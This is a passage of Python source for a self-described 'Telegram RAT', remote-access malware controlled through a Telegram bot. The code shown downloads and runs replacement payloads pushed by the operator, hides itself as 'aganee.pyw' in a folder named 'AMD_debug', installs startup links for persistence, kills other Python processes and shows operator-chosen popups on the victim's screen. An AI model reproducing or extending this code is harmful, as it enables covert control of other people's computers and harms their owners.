        bot.send_message(message.chat.id, '🔄 Начинаю обновление...')
        
        # Скачиваем новый файл
        file_info = bot.get_file(message.document.file_id)
        if not file_info.file_path:
            bot.send_message(message.chat.id, '❌ Не удалось получить путь к файлу.')
            return
        
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Сохраняем новый файл в AMD_debug
        new_file_path = os.path.join(AMD_DEBUG_PATH, "aganee.pyw")
        
        with open(new_file_path, 'wb') as f:
            f.write(downloaded_file)
        
        bot.send_message(message.chat.id, f'✅ Новый файл сохранен: {new_file_path}')
        
        # Обновляем автозапуск
        cleanup_startup_links()
        create_startup_link(new_file_path)
        
        bot.send_message(message.chat.id, '✅ Обновление завершено! Новый бот будет запущен при следующей загрузке системы.')
        
        # Запускаем новый файл
        try:
            subprocess.Popen([sys.executable, new_file_path])
            bot.send_message(message.chat.id, '🚀 Новый бот запущен!')
        except Exception as e:
            bot.send_message(message.chat.id, f'⚠️ Новый файл сохранен, но не удалось его запустить: {e}')
        
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при обновлении: {str(e)}')

def popup_show_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    text = message.text.strip()
    if not text:
        bot.send_message(message.chat.id, '❌ Текст не может быть пустым.')
        return
    
    bot.send_message(message.chat.id, f'💬 Показываю popup: "{text}"')
    
    try:
        # Используем Windows API для создания popup окна
        import ctypes
        from ctypes import wintypes
        
        # Экранируем текст для Windows API
        safe_text = text.replace('"', '\\"').replace('\n', '\\n')
        
        # Создаем popup через MessageBoxW с кнопками Да/Нет и topmost
        result = ctypes.windll.user32.MessageBoxW(
            0,  # hWnd (родительское окно)
            safe_text,  # lpText (текст сообщения)
            "Сообщение",  # lpCaption (заголовок)
            0x24 | 0x1000  # uType (MB_ICONQUESTION | MB_YESNO | MB_TOPMOST)
        )
        
        if result == 6:  # IDYES
            bot.send_message(message.chat.id, '✅ Пользователь выбрал: ДА')
        elif result == 7:  # IDNO
            bot.send_message(message.chat.id, '✅ Пользователь выбрал: НЕТ')
        elif result == 0:  # Ошибка
            bot.send_message(message.chat.id, '❌ Не удалось показать popup сообщение.')
        else:
            bot.send_message(message.chat.id, f'✅ Popup показан, результат: {result}')
        
    except Exception as e:
        # Если Windows API не работает, пробуем через PowerShell
        try:
            # Экранируем текст для PowerShell
            ps_text = text.replace('"', '`"').replace("'", "''")
            
            # Создаем PowerShell команду с кнопками Да/Нет
            ps_command = f'''
Add-Type -AssemblyName System.Windows.Forms
$result = [System.Windows.Forms.MessageBox]::Show("{ps_text}", "Сообщение", "YesNo", "Question", "DefaultButton1", "TopMost")
if ($result -eq "Yes") {{ Write-Output "YES" }} else {{ Write-Output "NO" }}
'''
            
            # Запускаем PowerShell
            result = subprocess.run([
                'powershell', '-Command', ps_command
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                output = result.stdout.strip()
                if output == "YES":
                    bot.send_message(message.chat.id, '✅ Пользователь выбрал: ДА')
                elif output == "NO":
                    bot.send_message(message.chat.id, '✅ Пользователь выбрал: НЕТ')
                else:
                    bot.send_message(message.chat.id, f'✅ Popup показан, результат: {output}')
            else:
                bot.send_message(message.chat.id, f'❌ Ошибка PowerShell: {result.stderr}')
                
        except Exception as e2:
            bot.send_message(message.chat.id, f'❌ Ошибка при показе popup: {str(e2)}')

@bot.callback_query_handler(func=lambda call: call.data == 'popup:cancel')
def popup_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'update:cancel')
def update_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Обновление отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

def start_bot_with_reconnect():
    """Запускает бота с автоматическим переподключением"""
    retry_delay = 5
    
    while True:
        try:
            print("🤖 Запускаем Telegram бота...")
            bot.polling(none_stop=True, timeout=20, long_polling_timeout=20)
        except Exception as e:
            error_msg = str(e).lower()
            print(f"❌ Ошибка соединения: {e}")
            
            # Проверяем тип ошибки
            if 'network' in error_msg or 'connection' in error_msg or 'timeout' in error_msg:
                print("🌐 Проблема с сетью, ждем восстановления...")
                wait_for_internet()
                retry_delay = 5  # Сбрасываем задержку после восстановления сети
            else:
                print(f"🔄 Переподключение через {retry_delay} секунд...")
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 1.5, 60)  # максимум 60 секунд

def check_internet_connection():
    """Проверяет интернет соединение"""
    try:
        import urllib.request
        urllib.request.urlopen('http://google.com', timeout=5)
        return True
    except:
        return False

def check_bot_token():
    """Проверяет валидность токена бота"""
    try:
        bot.get_me()
        return True
    except Exception as e:
        print(f"❌ Ошибка токена бота: {e}")
        return False

def wait_for_internet():
    """Ждет восстановления интернет соединения"""
    print("🌐 Ожидание восстановления интернет соединения...")
    while not check_internet_connection():
        time.sleep(5)
    print("✅ Интернет соединение восстановлено!")

if __name__ == '__main__':
    print("🚀 Запуск Telegram RAT...")
    
    # Инициализируем Qt для уведомлений
    print("🔔 Инициализация системы уведомлений...")
    init_qt_app()
    
    # Останавливаем другие Python процессы
    print("🔄 Остановка других Python процессов...")
    kill_other_python_processes()
    
    # Настраиваем AMD_debug папку и перемещаем скрипт
    print("📁 Настройка AMD_debug...")
    script_path = setup_amd_debug_folder()
    
    # Очищаем старые ссылки и создаем новую
    print("🔗 Настройка автозапуска...")
    cleanup_startup_links(allowed_script_path=script_path)
    create_startup_link(script_path)
    
    # Ждем интернет перед запуском
    if not check_internet_connection():
        wait_for_internet()
    
    # Проверяем токен бота
    if not check_bot_token():
        print("❌ Неверный токен бота! Проверьте API_TOKEN")
        input("Нажмите Enter для выхода...")
        sys.exit(1)
    
    print("✅ Токен бота валиден")
    
    # Уведомления отключены при запуске
    
    # Запускаем бота с переподключением
    start_bot_with_reconnect()
